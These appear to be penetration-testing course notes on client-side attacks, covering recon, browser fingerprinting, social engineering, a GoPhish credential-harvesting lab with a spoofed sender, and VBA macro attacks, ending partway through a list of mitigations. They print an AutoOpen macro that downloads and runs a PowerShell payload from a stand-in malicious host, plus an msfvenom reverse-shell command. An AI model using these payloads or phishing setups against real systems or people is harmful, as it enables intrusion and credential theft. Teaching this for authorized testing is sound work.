- Objectives:
  - Know What Client Side attacks are and the different types of it for initial access.
  - To Be able to perform Client side information and fingerprinting in order to know the key info regarding to target’s client side configuration (Browser, OS, Etc.)
  - Solid Understanding of Social Engineering ( Types, attacks) and the role of pretexting in successful social engineering campaigns
  - Be able to plan, deploy and manage phishing campaigns with tools like GoPhish
  - Understanding of What is Resources Development and Weaponization are in terms of client side attacks
  - Be able to Develop Your Own VBA Macros for initial access.
  - Be able to leverage functionality like ActiveX Controls to control Macro Execution in DOCs
  - Be Able to Dev and Customize Your own Macro enabled MS Office Doc for use in obtaining initial access.
  - Be Able to leverage HTML Apps for initial access.

---

### Intro To Client-Side Attacks:

- Its a Technique and tactics used by attackers to exploit vulnerabilities or misconfiguration in **_client side software_** or the Systems accessed by users/**_employees_**
- The Objectives of this attacks is to involve compromising end-user devices, applications or **_employees behaviors in order to gain initial access_** to target systems
- Client-side attacks Aims to simulate/emulate Real-world threats and assess an organizations security status by Targeting the weakest link in the security chain… **The employees.**
- **_In Nutshell .. We trying to_** leverage **_the installed software on the users/employees Devices in order to initial access into internal Infra._**
- Notice: That's mean Your Client-Side Attacks _will depend on the target software and the config of the target OS ._
- **Client-Side Attacks typically involve/require some users/_employees interaction and deception or Manipulation_ in order to get the client side software to execute the malicious code/payload**
- Those Kinds of attacks are more Dangerous than Server-side attacks as they do not require direct access to the target system or target network!
- In **Client-Side Attacks, Attackers deliver the malicious code/payload via trusted or standard delivery mechanisms like E-mail, USB, Compromised Websites, etc.….**

### **_Q : What Makes Client-Side Attacks attractive to attackers?_**

- Larger/Wider attack surface: end-users, Desktop Computers, laptops, smartphones and tablets are provided in any organization.. that provide us a larger attack surface for exploitation,
- User Interaction: **Client-Side Attacks leverage the Humans Vulnerabilities such as curiosity, trust and ignorance. to trick users into executing your payloads or _Divulging sensitive information_**
- Less Stringent Security Controls: end-users Devices **may** have less robust security measures compared to servers or networks infrastructure.
- Potentials for lateral movements : once we achieved our initial access through the **Client-Side Attacks, We May pivot to others systems or resources within the network to escalate privileges, or achieve persistence or exfiltrate data.**

### A comparison between **Client-Side Attacks** and **Server-Side Attacks**:

| **Aspect**        | **Client-Side Attacks**                                                                                                                    | **Server-Side Attacks**                                                                           |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------- |
| **1. Target**     | End-user devices (browsers, apps, OS, etc.)                                                                                                | Servers hosting applications, databases, or services                                              |
| **2. Objectives** | Manipulate or exploit client-side processes to steal data, inject code, or gain unauthorized access to sensitive info                      | Compromise the server’s infrastructure, steal data, alter server functions, or control the server |
| **3. Execution**  | Typically involve the delivery of malicious content or payloads to end user devices through channels like e-mail social engineering, etc.. | Attacker sends malicious requests directly to the server, exploiting server vulnerabilities…      |
| **4. Examples**   | Phishing, Drive-by downloads, malicious attachment, social eng.                                                                            | SQL Injection (SQLi), Remote Code Execution (RCE), Server-Side Request Forgery (SSRF).            |

### How **_Client-Side Attacks Works? Steps…_**

- **_1- Reconnaissance_** `@Your Checklist Should Have:`
  - [ ] Target’s Publicly available information
  - [ ] Social media Profiles
  - [ ] Company Websites
  - [ ] Job Posting
  - [ ] Identify employees and their Job Roles
  - [ ] Potential Targets within the organization
  - [ ] Technology stack
  - [ ] e-mail domain, Common Software used By Employees
- 2- Target Identification, Based on Step 1 `@Your Checklist Should Have:`
  - [ ] Identify specific individuals inside your target organization
  - [ ] Who have access to sensitive information?
  - [ ] Who Have Team Leader, owners, Executive position, IT Role Privileges?
  - [ ] Which One We Will be Potential target?
- 3- Payload/Resource Development `@Your Checklist Should Have:`
  - [ ] Develop a Malicious Document containing a payload. such as a Microsoft word Document with Embedded Macro or PDF File with a JavaScript exploit, etc.…
  - [ ] Test Before the Rest!: Test your resources in local lab environment made with all the same infrastructure assets and apps versions as much as possible before any Delivery!! to make sure that your target had no chance..
- 4- Payload Preparation `@Your Checklist Should Have:`
  - [ ] Create a convincing pretext for the payload delivery such as crafting a phishing email masquerading as an important document from a trusted resource
  - [ ] Set up infrastructure to host your Malicious Document or payload such as compromised website or a temporary file-sharing services
- 5- Payload Delivery.
  - [ ] Sending your phishing email to your selected employees
  - [ ] Urging them to review the attachment and click on the link to access important info!..
  - [ ] Make sure that your email should be urgent, fear, or curios
- Payload Execution.
  - [ ] Target receives your email, interact with it, the payload execute, exploiting vulnerabilities in the client software. Boom you are in …
  - [ ] Your Payload should established connection to your C2 Server for more interaction
- Post-Exploitation.
  - [ ] Perform Privi-esc stuff.
  - [ ] lateral movement maybe !
  - [ ] Some Data Exfiltration Would be nice too !

### ⇒ Referances:

1- https://www.zenarmor.com/docs/network-security-tutorials/what-is-client-side-attack

---

### Client-Side Attack Vectors:

### Q: What is Attack Vectors?

> A: **_It_** **_is a path or method used by attackers to gain unauthorized access to a system or network. a specific technique a hackers exploits to compromise, deliver malicious payloads, or manipulate systems or employees to achieve their objectives._**

### Types of Attack Vectors:

1. **Human-based Attack Vectors**: `Our Focus`
   - **Phishing**: Deceptive emails or messages designed to trick users into providing sensitive information (credentials, credit card details, etc.).
   - **Social Engineering**: Manipulating users into performing actions or divulging confidential information.
2. **Network-based Attack Vectors**
3. **Software-based Attack Vectors**:
4. **Physical Attack Vectors**:
   - **USB/Hardware-based Attacks**: Using physical devices like infected USB drives or rogue hardware to install malware or gain control of a system.
   - **Insider Threats**: Employees or contractors using their access to compromise systems for malicious purposes.

### Common client-side attack vectors based on the **MITRE ATT&CK framework**

### 1. **Spearphishing Attachments (T1566.001)**

- Attackers send malicious files disguised as **legitimate attachments in phishing emails**. When the user opens the file, malware is executed or credentials are harvested.

### 2. **Spearphishing Links (T1566.002)**

- Links to malicious websites are embedded in **phishing emails, social media, or text messages**. These links may direct users **to download malware or enter sensitive information into fake login pages**.

### 3. **Spearphishing via Service (T1566.003)**

- Phishing campaigns carried out through **third-party services like social media platforms or cloud-based file-sharing services**, where the attacker convinces the user to interact with a malicious payload.

### 4. **Drive-by Compromise (T1189)**

- Users are compromised by simply visiting a website with malicious code. This code takes advantage of vulnerabilities in the user’s browser, plugins, or the operating system to execute something.

### 5. **User Execution (T1204)**

- An attacker persuades the user to download and run malicious software (e.g., through fake installers, free software, or game cheats). It can also include the execution of malicious scripts or commands triggered by the user.

### 6. **Malicious Browser Extensions (T1176)**

- Adversaries develop or compromise browser extensions that perform malicious actions. These actions could range from capturing credentials to modifying web traffic in real-time.

### 7. **Exploitation for Client Execution (T1203)**

- Attackers exploit vulnerabilities in client applications like browsers, document viewers (e.g., Adobe PDF Reader), or media players to execute arbitrary code. This often occurs when the user opens a maliciously crafted file or visits a compromised website.

### 8. **Rogue Wireless Access Points (T1506)**

- Attackers set up rogue Wi-Fi access points to trick users into connecting. Once connected, the attacker can intercept traffic, steal credentials, or inject malware into the communication.

### 9. **Browser Session Hijacking (T1539)**

- This attack involves stealing session cookies to impersonate a user in an active session, gaining unauthorized access to web applications without needing login credentials.

### 10. **Input Capture (T1056)**

- Techniques like keylogging, form-grabbing, or capturing input fields from web forms to steal user credentials or sensitive information from client-side applications.

### 11. **Exploitation of Office Applications (T1203)**

- Documents with malicious macros or scripts exploit vulnerabilities in software like Microsoft Word, Excel, or PowerPoint to execute malware on the client’s machine.

### 12. **Man-in-the-Browser (T1185)**

- A technique where malware infects a user's browser and manipulates web traffic or captures sensitive information like login credentials or payment data during the user’s online sessions.

### 13. **Remote File Copy (T1105)**

- An adversary may trick users into downloading and opening files that seem legitimate, but these files could be malware delivered over the network or from a cloud service.

### 14. **Command and Scripting Interpreter (T1059)**

- Attackers use client-side interpreters, like PowerShell, JavaScript, or VBScript, to execute malicious scripts locally on the victim’s machine. **This often follows initial compromise or phishing**.

### 15. **Watering Hole Attacks**

- **Method**: Attackers compromise a website that is frequently visited by a specific group of users. The goal is to infect these users by exploiting their trust in the legitimate site6.
- **Targeting**: Highly targeted, focusing on specific organizations, industries, or groups.
- **Delivery**: Can involve **drive-by downloads**, but often includes files that users might willingly download, thinking they are safe.

### ⇒ Referances:

https://attack.mitre.org/techniques/enterprise/

---

### Client-side Recon:

- The more info you know == The more success in your clint side attack.
- To success in nutshell you need to know what client side software is running on a target system.

### Just Like any Pen-testing, Recon is :

- **_Passive Client Recon == Without Interactive with target:_**
  - **_OSINT_**
    - [ ] Social media platforms for employee profiles, Company info and Job Posting (LinkedIn, Twitter)
    - [ ] Tools: Google Dorks, Maltego, The Harvester, etc…
  - **_Search Engine Recon_**
    - [ ] Using advanced search queries on search engines to discover publicly available information about the organization systems
    - [ ] Tools : Google Search Operators, Shodan, other Search engines
  ***
- **_Active Client Recon == Interactive with target:_**
  - Client Fingerprinting OR Browser Fingerprinting:
    - Its a technique used to gather info about a target web browser and software stack in order to aid in the development of tailor made (Client specific) payload for initial access
    - With it you shall know : Browser and Browser Version, OS and sys Architecture, etc..
  - Social Engineering:
    - Engaging with target or employee through phone calls, emails, or other communication channels to gather sensitive info, credentials, or access permissions.
    - Tools : SET, PhishMe, BeFF.

---

### Client-Fingerprinting:

- Of cource target employee computer is not publicly accessible, we need to obtain this info from the target itself.
- By performing Social engineering techniques like phishing to the target employees until clicking a link to a web page that we control.
- This Web App will typically be configured to run a script that obtains info like the browser version and os version.

### Browser Fingerprinting.

- Its an active info gathering technique that leverage client-side scripting languages like JS to extract information about the target browser and underlying OS
- To do this technique You gonna need to purchase a Domain and set up a fictitious web page that runs a specific JavaScript code.
- Commonly all modern web browser execute those scripts without any problems except Brave browser ✨😉
- Our primary Objectives is to know those info about our target :
  - [ ] Web browser
  - [ ] Web browser Version
  - [ ] Plugins/Extensions
  - [ ] Underlying OS Information(OS, OS Version, Sys Arch .. etc)
  - Tools : `fingerprintjs2` lib

### Browser Fingerprinting Demo Lab

```bash
# Install Apache2
sudo apt-get install apache2
# Run the service
sudo systemctl start apache2
sudo systemctl status apache2 # To make sure the its active and enabled
# You Can replecate all those steps in any web server that can resolve to an domain.
# In linux the default Dir that you store your web site files is: /var/www/html
~$ cd /var/www/html
~$/var/www/html] sudo git clone {fingerrint lib} # Clone the lib here
# let modify the index.html file
~$/var/www/html] cd /fingerprintjs2/
~$/var/www/html/fingerprintjs2] sudo vim index.html
# You Can Put whatever you want or modyfiy anything just be sure that you know what you are Doing...
# This is only demo .. In Real World we got BeEF :)0
# Dont Play with JS Code if you dont know whay you are doing exectly
# You Gonna need to code a little thing :
# 1- a separate php script that save the web browser fingerprint to a txt file
# 2- a php request to call the results, Code examples will inserted as photos.
```

---

### Intro To Social Engineering:

> \*In the context of **penetration testing**, **social engineering** refers to **the** **use of psychological manipulation to deceive individuals into divulging sensitive information or performing actions that could compromise security. It exploits human behavior and trust, bypassing technical defenses like firewalls or encryption.\***
>
> \*Social engineering attacks test the human element of security and can reveal weaknesses in employee training or company processes. These techniques often aim to trick employees into **providing access to systems or confidential information that can be leveraged for further attacks.\***

**The Core of Social engineering is to put people in situations ware they will rely on their base instincts and most common forms of social interactions Like :**

- **The Desire to be helpful**
- **The tendency to trust people**
- **The Desire for approval**
- **The fear of getting in trouble**
- **Avoiding conflict or arguments**

The Advent and adoption of social networks as a form of communication has vastly improved the ability of attackers to perform S-E attacks, as targets can easily contacted by anyone in the world with ease!, Furthermore Social networks have also led to the rise of employees advertently exposing a lot of privet info that can be used by us in aid of our SE Attacks (Emails, Phone Numbers, Addresses, etc).

### **Types of Social Engineering techniques:**

### 1. **Phishing:**

> **Phishing** is a simulated/OrNot! attack designed to assess **how employees respond to deceptive messages intended to trick them into revealing sensitive information, clicking on malicious links, or executing harmful actions.**

## **Types of Phishing:**

1. **Email Phishing (Large random scale):**
   - Fake emails designed to appear as legitimate, urging the recipient to perform a specific action.
   - Example: A tester sends an email pretending to be from HR, asking employees to log in to a portal to review their annual performance.
2. **Spear Phishing:**
   - Highly targeted phishing attack aimed at specific individuals, using personalized information to appear more convincing.
   - Example: The tester researches a manager’s interests (e.g., sports) and sends a customized email offering free tickets, requiring them to log into a fake website.
3. **Whaling:**
   - Aimed at high-profile targets like executives or senior management.
   - Example: A tester impersonates the CEO, requesting confidential financial data from the CFO.
4. **Smishing (SMS Phishing):**
   - Using text messages to deceive the victim into taking harmful actions.
   - Example: The tester sends a fake delivery notice asking the employee to click a link to "reschedule" a package.
5. **Vishing (Voice Phishing):**
   - Conducted via phone calls to gather sensitive information or gain access.
   - Example: The tester pretends to be an IT support member and asks the victim to provide their network credentials over the phone.

## **Phases of a Phishing Penetration Test:**

1. **Planning and Reconnaissance Scope Definition:**
   - Define goals, target employees, and attack vectors with stakeholders.
   - Obtain necessary approvals and define **Rules of Engagement (ROE)** to avoid legal or operational issues.
2. **Delivery & Payload Creation:**
   - Craft phishing emails or messages that mimic real-world scenarios.
   - **Develop techniques to bypass spam filters and security controls**
   - Create fake websites (if applicable) that capture credentials or trigger events (like clicking a link).
3. **Execution:**
   - Send the phishing messages and monitor employee actions.
   - Collect data on who clicked links, entered credentials, or responded to prompts.
4. **Analysis and Reporting:**
   - Analyze test results to identify patterns, vulnerabilities, or high-risk employees.
   - Provide metrics such as the **click rate** or **compromise rate** (the percentage of employees who fell for the phishing attempt).
5. **Post-Test Awareness and Training:**
   - Debrief employees about the phishing simulation.
   - Provide training and strategies to improve detection and response to future phishing attempts.

**_Note_** → **_Spear Phishing:_** is the same process but in targeted manner!, In Other wards you gonna **spend much more time to gathering info about a specific higher target and personalize your package to this target (Message Tailoring)**

### ⇒ References:

1- https://github.com/PhishyAlice/awesome-phishing

2- https://github.com/L4bF0x/PhishingPretexts/tree/master

---

### 2. Pretexting:

It About crafting a false but plausible identity or story (the "pretext") to gain trust, access, or control. The goal is to exploit human behavior, assumptions, and trust to achieve the objectives of the red team’s simulated attack.

### **Key Elements of Pretexting in Red Teaming:**

1. **Persona Development:**
   - The red teamer creates an identity such as a customer, IT support staff, HR personnel, or government official.
   - The persona aligns with the target’s expectations, including relevant knowledge and terminology to appear credible.
2. **Scenario Crafting:**
   - The story provides context for the interaction, such as troubleshooting IT issues, conducting an audit, or verifying an account.
   - This scenario must align with the organization's typical operations and culture to avoid suspicion.
3. **Gathering Reconnaissance:**
   - Information collected during reconnaissance (like names, organizational charts, or current issues) helps refine the pretext.
   - Red teams may use Open Source Intelligence (OSINT) to learn about the target’s behavior and routines.
4. **Medium of Engagement:**
   - Pretexting can occur through emails (phishing), phone calls (vishing), in-person interactions, or even fake websites (pharming).
   - Red teamers adapt their approach based on the target's preferred communication channels.
5. **Eliciting Action:**
   - The goal is to trick the target into providing credentials, clicking malicious links, revealing information, or granting unauthorized access.

### **Examples of Pretexting Scenarios:**

- **IT Support Call:** A red teamer calls an employee posing as helpdesk staff, asking them to reset their password or install a security patch.
- **Fake Vendor Interaction:** Impersonating a supplier or business partner to gather confidential project details.
- **Social Event Setup:** Red teamers may create a fake charity event or internal survey to harvest personal information like email addresses and security questions.
- Job Interview Scam: an attacker pretend to be a recruiter or hiring manager from a company and contacts job seekers

---

### ⇒ References:

https://github.com/giuliacassara/awesome-social-engineering

---

### Phishing with GoPhish

### What is GoPhish?

> An open-source phishing simulation tool designed for professionals to test an organization’s security awareness. It allows administrators to create, send, and monitor phishing campaigns to assess how users react to malicious emails. By mimicking real-world phishing attacks.

### Key Features of GoPhish:

1. **Campaign Management & Creation**:

   Easily create and customize phishing campaigns. You can define parameters like target groups, email templates, and sending profiles.

2. **Target Management**:
   Users(attackers) can manage their clients lists and segment them based on various criteria. such as department, role, location
3. **User-friendly Dashboard**:

   The interface offers an intuitive dashboard to manage campaigns and visualize results in real-time.

4. **Landing Page Creation**:
   GoPhish enables users to create phishing landing pages that mimic legitimate login portals or websites to capture credentials or other sensitive data
5. **Email & Landing & Editing Page Templates**:

   Customize emails and create landing pages to mimic phishing attacks by **Providing a built in email template editor with a _WYS|WYG (What You See is What You Get)_** interface, It can replicate emails similar to known phishing schemes, such as credential harvesting forms.

6. **Tracking Metrics**:

   Monitor who opened the email?, clicked the links?, submitted data (if any), or reported the email. This helps organizations identify patterns and weak points.

7. **Self-hosted and API Support**:

   As a self-hosted tool, organizations maintain control over the data, and the API allows automation and integration with other security tools.

8. **Multi-user Support**:

   Different teams or individuals can use GoPhish simultaneously to manage separate campaigns.

### ⇒ References:

1- https://getgophish.com/

2- https://docs.getgophish.com/user-guide/installation

3- https://github.com/gophish/gophish

---

### Lab Demo : Phishing With GoPhish…

### What We Will Need ? :

1. A GoPhish Installed. preferred on VPS!
2. A Mail box client app to see our final results.
3. A template generated or cloned.
4. A list of targets emails, first name, last name and job role.

```bash
# First To Avoid much time for loading the GOPhish
# Hit to templates -> statics -> base.html -> remove the fonts.google elements
# Do The Same thing aboe For The Login Page ...
# -------------------------------------------------
# Follow the installation and configuration steps that provided in documentation until runing GoPhish up on your brwoser
# sighn in with : username: admin, Password: phishingpasswd
# -------------------------------------------------
# Follow Those Steps...
# -------------------------------------------------
# 1- Configure @Sending Profiles: -> The Most important -> {This is ware you provide your SMTP Server Detailes and Who is the e-mail from?}
			From : info <support@demo.INC> ## Spofing email that belong to organization
			Host : ## Spicify your own Domain
			Username : ## Spicify your own User@demo.INC
			Password : ## Waht ever ...
# -> **Send Test email is mandatory | Choose one you Own Never a Target!!.**
# -------------------------------------------------
# 2- Configure @Landing Pages: -> {That will Mimic a login portal or password recovery form}
# # Simply import site or just Insert the HTML elements...
# #  -> **Capture submitted data is mandatory.
# -> Redirect to the Original page/ Site {The Real One Ha!}**
# -------------------------------------------------
# 3- Configure @Email Templates: -> Take a real care on this one...
			Name : xyz Password Reset
			Subject : Password Reset Instructions
# -> Import Email Button Will allow you to insert the specified templates you want.
# -> You Can ADD Your Malicious file by Add File Button
# -------------------------------------------------
# 4- Configure @Users&Groups -> {Who We Want To Send To ?}
			Name : # Choose What ever your Like
			Bulk Import Users : # This is Your target eMail File -> Support CSV Files Only
# -------------------------------------------------
# 5- Configure @New Campaign
# -> Everything is already set .. Just Name it .. give the GoPhish URL listener {Phishing Server} .. launch date time and →  launch.
# Make Sure To Set and Test Befor Send...
# Test everey thing on your own emails and resources before sending it to your actuall target.
# Thats how you will avoid any errors.
```

---

### Resource Development & Weaponization.

> **\*Resource Development** and **Weaponization** are key phases that help simulate realistic attack scenarios. These phases align with the adversary tactics from frameworks like MITRE ATT&CK, where attackers prepare and create the tools, infrastructure, and payloads they need to compromise their targets.\*

Those terms had been used and Implemented into modern cybersecurity frameworks and kill chains like MITRE ATT&CK and The Cyber Kill Chain (Lockheed Martin), They Both Provide Structured approaches to understand and analyzing cyber threats.

---

### The _MITRE ATT&CK Framework_

- An accessible knowledge base of adversaries tactics and techniques based on real world threats and APT Groups → It Developed to understand how the attack are performed.
- ATT&CK → an Abbreviation for Adversarial tactics, techniques and common knowledge
- It Usually used as a baseline for Adversarial behavior and highlights the various phases of threat attack lifecycle → What software they used and the OS they target .. etc
- Used by Red/Blue/Purple teams to implement an engagements based on specific threat actor/APTs

  **_⇒ In the terms on Client side attack Chapter we will focus on PRE Matrix_**

1. Reconnaissance
2. Resource Development
3. Initial Access → Phishing, Trusted Relationship(S-E)

---

### **Note: _Tactics_** and **_Techniques_** refer to different layers of adversary behavior, helping you to understand, track, and mitigate threats effectively. Here's how they differ:

### **1. Tactics:**

- **Definition**: Tactics represent the _why_—the **high-level objectives** or goals that attackers are trying to achieve during an attack.
- **Purpose**: These are the strategic steps an adversary takes to advance within a system or network. Each tactic answers **“What is the attacker trying to accomplish at this stage?”**
- **Examples**:
  - **Initial Access**: How the attacker gets into the target network (e.g., phishing).
  - **Persistence**: How the attacker maintains access even after reboots or interruptions.
  - **Exfiltration**: How they steal sensitive data from the target.

**Analogy: Think of tactics as the different stages in a heist, like gaining entry, avoiding detection, or escaping with the loot.**

---

### **2. Techniques:**

- **Definition**: Techniques represent the _how_—the **specific methods** or actions attackers use to achieve their objectives (i.e., tactics).
- **Purpose**: Each technique shows **“How is the attacker achieving this goal?”** Techniques can have **sub-techniques** that provide even more granularity.
- **Examples**:
  - **Phishing** (Technique under Initial Access): Using fake emails to lure a victim into providing credentials.
  - **Credential Dumping** (Technique under Credential Access): Extracting stored passwords or hashes from a compromised machine.
  - **PowerShell Execution** (Technique under Execution): Using PowerShell scripts to execute malicious commands.

**Analogy: If tactics are the stages of a heist, techniques are the specific actions like picking a lock, disabling cameras, or cracking a safe.**

### **Relationship between Tactics and Techniques:**

- **Tactics** represent the adversary’s overarching strategy (what needs to be achieved).
- **Techniques** are the methods employed to accomplish those strategies at each phase.
- A **single tactic** can have multiple associated techniques, and attackers often chain multiple tactics and techniques together in a campaign.

### _The Cyber Kill Chain by Lockheed Martin_

Its a framework that outlines the typical steps involved in a cyberattack. It helps cybersecurity teams understand, detect, and disrupt adversarial activities across different phases of the attack. The model consists of **seven stages**, emphasizing that attacks follow a structured approach, and early detection can prevent attackers from achieving their objectives.

---

### **The Seven Stages of the Cyber Kill Chain:**

1. **Reconnaissance**
   - The attacker gathers information about the target (e.g., network layout, technologies in use, employees) using tools like OSINT, social engineering, or scanning software.
2. **Weaponization**
   - The attacker creates a malicious payload (like malware, a phishing email with an exploit, or malicious attachments) based on the **Reconnaissance phase** above to use against the target.
3. **Delivery == Initial access**
   - The payload is delivered to the target via phishing emails, malicious websites, infected USB drives, or other vectors.
4. **Exploitation**
   - The delivered payload takes advantage of a software, hardware, or human vulnerability to gain an initial foothold.
5. **Installation**
   - Malware or a backdoor is installed on the target system, creating a persistent connection for the attacker.
6. **Command and Control (C2)**
   - The attacker establishes communication with the compromised system to send commands and receive data.
7. **Actions on Objectives**
   - The attacker or Red Teamer takes actions to achieve their goal, such as exfiltrating data, disrupting services, or spreading laterally across the network.

---

### **Uses of the Cyber Kill Chain**

- **Detection and Prevention:** The model helps us to understand how to disrupt the attack at each stage.
- **Threat Hunting and Incident Response:** It provides a guide for hunting adversaries and prioritizing defenses.
- **Red Teaming:** Teams can simulate attacks following the Kill Chain to assess an organization’s defenses.
- **Post-Incident Analysis:** It offers a structured way to analyze how far an attack progressed and where defenses failed.

---

### Breakdown of these Our Focused phases:

## 1. **Resource Development**

This phase focuses on **preparing the assets needed to carry out the attack**. It mirrors the steps a real-world adversary would take to gather the resources required before launching an intrusion. These resources can include infrastructure, accounts, tools, and more.

### Activities in Resource Development:

- **Domain and infrastructure setup:**
  - Registering domains that can be used for phishing campaigns.
  - Renting or acquiring Virtual Private Servers (VPS), proxies, or bulletproof hosting for command-and-control (C2) infrastructure.
- **Acquiring compromised credentials:**
  - Purchasing stolen user credentials from underground forums.
  - Collecting leaked or public credentials (e.g., from GitHub repositories or credential dumps).
- **Creating fake personas and accounts:**
  - Building social media profiles to impersonate trusted entities.
  - Setting up email accounts to send phishing emails or lure targets.
- **Custom tooling:**
  - Developing custom malware, exploits, or payloads that bypass antivirus/EDR solutions.
  - Using publicly available tools (e.g., Cobalt Strike or Metasploit) and obfuscating them to avoid detection.

---

## 2. **Weaponization**

This phase involves transforming **resources that we just developed into actionable attack tools**. In weaponization, **red team operators package their tools and payloads to exploit specific vulnerabilities or evade detection mechanisms.**

### Activities in Weaponization:

- **Payload development:**
  - Crafting **malicious documents** (e.g., weaponized PDFs or Excel macros) that deliver malware when opened by the target.
  - Creating **phishing links** that appear legitimate but redirect to malicious sites or credential-stealing portals.
- **Obfuscation of tools and malware:**
  - Encoding or encrypting payloads to avoid detection by antivirus or endpoint security tools.
  - Using packers or polymorphic code to alter payload signatures dynamically.
- **Embedding exploits in delivery vectors:**
  - Combining zero-day or known exploits into payloads to achieve remote code execution.
  - Embedding backdoors into software updates or compromised installers.
- **Command-and-Control (C2) setup:**
  - Configuring implants or agents to communicate back to the attacker’s C2 infrastructure.
  - Choosing the communication protocol (e.g., HTTP, DNS, or HTTPS) to blend with normal traffic and evade network monitoring tools.

### **Resource Development VS Weaponization:**

- **Focus** : **Resource Development focuses on acquiring the necessary tools and knowledge whereas weaponization focuses on turning those resources into an active attack payloads or techniques**
- **Stage in attack lifecycle : Resource Development before Weaponization usually. Once the necessary Resources developed they are weaponized for use in the attack.**

---

### VBA Macro Fundamentals and other things.

### **What is VBA and VBA Macros?**

- VBA is an event-driven programming language built into Microsoft Office applications. It allows users to automate tasks by writing small scripts (macros) to interact with the Office interface and data. it can be used to interact with Windows API! and implement user-defined functions. it also enable you to manipulate the user interface feature of the host application.
- Microsoft office allows users to embed VBA macros in docs and spreadsheets for the automation of manual tasks and management of dynamic data.
- Each office App have a built in VBA Integrated development environment (IDE)
- VBA allows users to work with objects that represent elements of the office applications (worksheets, cells, shapes).
- **_In nutshell_**, Macros is a piece of VBA code embedded in office documents, as a result macro have been popularly weaponized to facilitate the execution of arbitrary code or executables.
- Macros Couldn't be embedded at all within the default MS word Documents file.(.DOCX , .DOTX).
- DOCM and DOTM file extensions allows you to embed Macros.
- Note : Microsoft word perform file data validation prior to opining a file, it happens in form of data structured identification against the OfficeOpen XML standard and the Validation performed by MS Office’s **_WWLIB.DLL_** component
- _THE FILE EXTENTION PLAYS NO ROLE IN THIS DATA VALIDATION PROCESS, IF ANY ERROR OCCURS DURING THE DATA STRACTURE IDENTIFICATION, THE FILE WILL NOT OPEN._

### **WScript and VBA.**

([Windows Script](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wscript)) is a scripting ENV in Windows that allows users to run scripts written in VBScript or JScript (Not JavaScript).

### WScript is commonly used for:

- **File and folder manipulation** (creating, deleting, copying)
- **Registry modifications**
- **Network operations** (like pinging IPs or interacting with network shares)
- Automating **Windows tasks** (e.g., launching apps or manipulating running processes)

**_Think of it like calling a library of class in programming that give you access to additional stuff!_**

## **Common WScript Operations and VBA Equivalents**

| **WScript Operation**                     | **VBA Equivalent**                                             |
| ----------------------------------------- | -------------------------------------------------------------- |
| `WScript.Echo` (print message to console) | `MsgBox "Message"`                                             |
| `CreateObject("WScript.Shell")` ;)        | `Set objShell = CreateObject("WScript.Shell")`                 |
| `WScript.Sleep 5000` (pause execution)    | `Application.Wait (Now + TimeValue("0:00:05"))`                |
| `FileSystemObject` for files/folders      | Same in VBA using `CreateObject("Scripting.FileSystemObject")` |
| `WScript.Arguments` (command-line args)   | VBA can use `ThisWorkbook.Path` or InputBoxes                  |

### **Macros in Client-Side Attacks**

While macros offer productivity benefits, they are **infamously exploited by attackers** to execute malicious payloads, leading to **client-side attacks**. These attacks occur when users open compromised files, triggering the malicious macros on the client machine.

---

## 1. **How Attackers Use Macros in Client-Side Attacks**

### **Delivery Mechanism**

- **Social engineering**: Attackers distribute infected documents via **phishing emails**, websites, or social media.
- **Document attachments**: Files in `.docm`, `.xlsm`, or `.pptx` formats are disguised as invoices, resumes, reports, or government forms to lure victims into enabling macros.
- **Weaponized Templates**: Attackers leverage macros embedded in **remote template files**, downloading the real payload when the document opens.

### **Execution Flow:**

1. **Phishing email** with an attachment (Excel, Word, or PowerPoint) sent to the victim.
2. When the user opens the document, a **"Enable Content"** prompt appears, requesting permission to run macros.
3. Once macros are enabled, the malicious code runs, often fetching **second-stage malware** from the internet or executing shell commands directly.

---

## 2. **Examples of Macro-based Payloads**

- **Downloading and Executing Malware:** The macro downloads executables (e.g., ransomware or backdoors) using `WScript` or `PowerShell`.
  Example:
  ```vbnet
  Sub AutoOpen()
      Set objShell = CreateObject("WScript.Shell")
      objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""IEX(New-Object Net.WebClient).DownloadString('<http://malicious-server/payload.ps1>')"""
  End Sub
  ```
  **Usage:** This macro runs automatically upon document opening (`AutoOpen`) and uses PowerShell to download and execute a malicious payload.
- **Command and Control (C2) Channels:** Macros can establish connections to **C2 servers** to receive commands or exfiltrate data.
- **Information Stealers:** Some macros execute commands to collect passwords, system information, or browser cookies using PowerShell or system tools.
- **Shellcode Injection:** A macro may decode shellcode and inject it into memory using Windows API calls.

---

## 3. **Key Attack Techniques Using Macros**

- **Auto-execution:**
  - Use of `AutoOpen` or `Workbook_Open()` functions to execute the macro code as soon as the document opens.
- **Obfuscation:**
  - Attackers **obfuscate macro code** to avoid detection by antivirus software. This includes encoding payloads in Base64 or splitting commands across multiple lines to bypass static analysis.
- **Fileless Execution:**
  - The macro directly invokes **WMI, PowerShell, or CMD commands** without dropping any files to disk, reducing detection chances by traditional security tools.
- **Sandbox Evasion:**
  - Macros can include checks to identify whether the environment is a sandbox or virtual machine. If detected, the macro terminates to avoid security analysis.

---

## 4. **Notable Attacks Involving Macros**

- **Emotet:**
  A banking Trojan that spread through macro-laden Word documents, later evolving into a platform for other malware such as TrickBot and Ryuk ransomware.
- **Dridex:**
  A sophisticated banking malware distributed via Excel files with malicious macros. Dridex macros downloaded and executed additional payloads to steal financial information.
- **Locky Ransomware:**
  This ransomware campaign used Word documents with macros to download and encrypt victims' data, demanding a ransom in Bitcoin.

---

## 5. **Tools Used by Attackers for Macro-based Attacks**

1. **MSFVenom (Metasploit Framework):**

   Used to generate malicious VBA payloads that can be embedded into Office documents.

   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f vba
   ```

2. [\*\*EvilClippy](https://github.com/outflanknl/EvilClippy):\*\*

   A tool to inject malicious macros into Microsoft Office documents while bypassing some security checks.

3. **MacroPack:**

   Used to automate the generation of obfuscated macro payloads and pack them into Office documents. We gonna play with it..

---

## 6. **Mitigation Strategies**

1. **User Awareness & Training:**
   - Educate users to be cautious with **unexpected attachments** or files requesting them to **enable macros**.
2. **Disable Macros by Default:**
   - Disable macros via **Group Policy** for users who do not require them.
   - Use **macro security settings** in Office to allow only digitally signed macros.
3. **Email Filtering & Sandbox Inspection:**
   - Implement **email filters** to block malicious attachments.
   - Use **sandbox environments** to analyze suspicious documents.
4. **Endpoint Detection & Response (EDR):**
   - Monitor processes like **PowerShell** and **CMD** being spawned by Office applications.
5. **Office 365 Threat Protection:**
